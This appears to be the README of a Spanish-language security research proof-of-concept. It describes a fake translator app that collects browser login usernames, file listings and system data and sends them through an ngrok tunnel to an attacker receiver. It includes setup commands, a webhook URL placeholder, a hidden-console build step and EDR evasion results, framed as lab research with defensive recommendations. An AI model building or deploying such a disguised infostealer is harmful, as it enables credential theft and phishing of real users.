# TraductorIA
Traductor Pro — PoC: Agente que hace más de lo que dice
> **⚠️ Aviso legal y ético**
> Este repositorio contiene una **Prueba de Concepto (PoC) con fines exclusivamente educativos y de investigación en ciberseguridad**. Todo el código está diseñado para ejecutarse **únicamente en entornos controlados de laboratorio** (VMs propias, redes aisladas, con consentimiento explícito de los participantes).
> **No uses este código contra sistemas que no sean tuyos.** El uso indebido puede violar leyes locales e internacionales.
---
📖 Descripción
`Traductor Pro` es una PoC que demuestra cómo un programa aparentemente inofensivo (un traductor español⇄inglés) puede, en segundo plano, recolectar y exfiltrar información sensible del usuario sin ser detectado por soluciones EDR/AV en su configuración por defecto.
El objetivo es demostrar que la capacidad maliciosa no requiere malware clásico: sin shell, sin procesos hijos, sin inyección de código.
Mensaje central
> El modelo de detección actual de los EDR está optimizado para cazar malware clásico (procesos hijos, inyección, persistencia). No está optimizado para detectar software que solo lee archivos del usuario y hace conexiones HTTPS de bajo volumen.
---
🎯 Objetivos de la investigación
Demostrar que un agente "inocente" puede exfiltrar credenciales de navegador sin ser detectado.
Comparar la respuesta de distintos EDR/AV: FortiEDR, Microsoft Defender, Cortex XDR.
Analizar el impacto de la coexistencia de soluciones de seguridad en la protección efectiva.
Documentar el ciclo completo: recolección → exfiltración → phishing.
---
🏗️ Arquitectura
```
┌─────────────────────┐         ┌──────────────────────┐         ┌─────────────────┐
│  Windows víctima    │         │   Túnel (ngrok)      │         │  Kali (atacante)│
│                     │         │                      │         │                 │
│  TraductorPro.exe   │────────▶│  https://xxx.ngrok   │────────▶│  receptor.py    │
│  (señuelo + agente) │  HTTPS  │  -free.app/recibir   │  HTTP   │  (escucha 8000) │
└─────────────────────┘         └──────────────────────┘         └─────────────────┘
```
Componentes
Componente	Función
`traductor_pro.py`	Señuelo: GUI de traductor español⇄inglés
`agente_v3.py`	Módulo real: recolección + exfiltración
`receptor.py`	Servidor en Kali que recibe y formatea los datos
ngrok	Túnel HTTPS que expone el receptor a internet
PyInstaller	Empaquetado del señuelo + agente en un `.exe`
---
🔬 Qué hace el agente
Capa 1 — Recolección pasiva del sistema
Hostname, usuario de Windows, versión de SO, arquitectura.
IP local (vía socket UDP, sin `subprocess`).
IP pública + geolocalización (ciudad, región, ISP) vía `ipinfo.io`.
Capa 2 — Listado de archivos de interés
Escaneo de `Desktop`, `Documents`, `Downloads`, `Pictures`.
Filtro por extensiones sensibles: `.txt`, `.pdf`, `.docx`, `.xlsx`, `.kdbx`, `.ovpn`, `.pem`, `.key`.
Solo lista metadatos. No lee contenido.
Capa 3 — Lectura de credenciales de navegador
Copia de `Login Data` (SQLite) de Chrome y Edge a `%TEMP%`.
Consulta `SELECT origin_url, username_value FROM logins`.
Filtro por URLs de interés: Gmail, Outlook, bancos, redes sociales, MercadoLibre, AFIP, etc.
No desencripta contraseñas. Solo usuario/correo. Esto reduce el ruido y mantiene la PoC en zona gris.
Exfiltración
Todo se empaqueta en JSON y se envía por HTTPS POST al webhook.
Ciclo repetido cada 60 segundos.
Header `ngrok-skip-browser-warning` para evitar el interstitial de ngrok.
---
🚀 Uso (solo en laboratorio)
Requisitos
Python 3.8+
Kali Linux (o cualquier Linux) para el receptor
Windows 10/11 (VM) para la víctima
ngrok (cuenta gratuita) para el túnel
PyInstaller (opcional, para empaquetar)
Instalación
```bash
git clone https://github.com/TU-USUARIO/traductor-pro-poc.git
cd traductor-pro-poc
pip install -r requirements.txt
```
Paso 1: Levantar el receptor en Kali
```bash
python3 src/receptor.py
```
Paso 2: Levantar el túnel con ngrok
```bash
ngrok http 8000
```
Anotá la URL que te da ngrok (ej: `https://abc123.ngrok-free.app`).
Paso 3: Configurar el agente
En `src/agente_v3.py`, cambiá:
```python
WEBHOOK_URL = "https://abc123.ngrok-free.app/recibir"
```
Paso 4: Ejecutar en Windows (VM víctima)
```bash
python src/traductor_pro.py
```
O compilar a `.exe`:
```bash
pyinstaller --onefile --noconsole --name "TraductorPro" src/traductor_pro.py
```
---
📊 Resultados
EDR/AV probado	Resultado
Microsoft Defender (con Forticlient Zero trust como AV principal)	No detecta (Defender en modo pasivo)
Microsoft Defender (sin FortiEDR)	Sí detecta: `Trojan:Win32/Wacatac.C!ml`
SmartScreen	funciona en ciertas ocasiones pero no es seguridad, el usuario elije (binario sin firma)
---
💡 Hallazgos clave
El modelo de detección actual tiene un punto ciego: los EDR están optimizados para cazar malware clásico, no software que solo lee archivos y hace HTTPS.
La coexistencia de EDRs puede crear puntos ciegos: cuando FortiEDR se registra como AV principal, Defender pasa a modo pasivo.
El eslabón más débil es el usuario: SmartScreen saltó y fue ignorado.
El phishing cierra el ciclo: con el correo capturado, se puede montar una campaña que no pasa por el endpoint.
Ver `docs/RECOMENDACIONES.md` para las mitigaciones.
---
📁 Estructura del proyecto
```
traductor-pro-poc/
├── README.md
├── LICENSE
├── requirements.txt
├── src/
│   ├── traductor_pro.py
│   ├── agente_v3.py
│   └── receptor.py
├── docs/
│   ├── ARQUITECTURA.md
│   └── RECOMENDACIONES.md
├── ejemplos/
│   └── payload_ejemplo.json
└── scripts/
    └── setup_ngrok.sh
```
---
🛡️ Recomendaciones defensivas
Capa	Recomendación
Endpoint	Verificar que Defender no esté en modo pasivo si FortiEDR no cubre todo. Auditar políticas de ambos.
Red	Inspección TLS saliente, bloqueo de dominios de túnel (ngrok, etc.) en entornos corporativos.
Identidad	MFA en todas las cuentas críticas.
Usuario	Educación sobre SmartScreen, descarga de binarios y phishing.
Datos	Cifrado de discos, protección de `Login Data` con AppLocker/WDAC.
---
⚖️ Licencia
Este proyecto se distribuye bajo licencia MIT con la condición adicional de que solo puede ser usado con fines educativos y de investigación en ciberseguridad. Ver `LICENSE`.
---
🙏 Créditos
Investigación original y PoC.
Inspirado en técnicas documentadas de MITRE ATT&CK: T1082, T1033, T1071, T1555.003.
---
📚 Referencias
MITRE ATT&CK — T1555.003: Credentials from Web Browsers
Microsoft — Defender passive mode
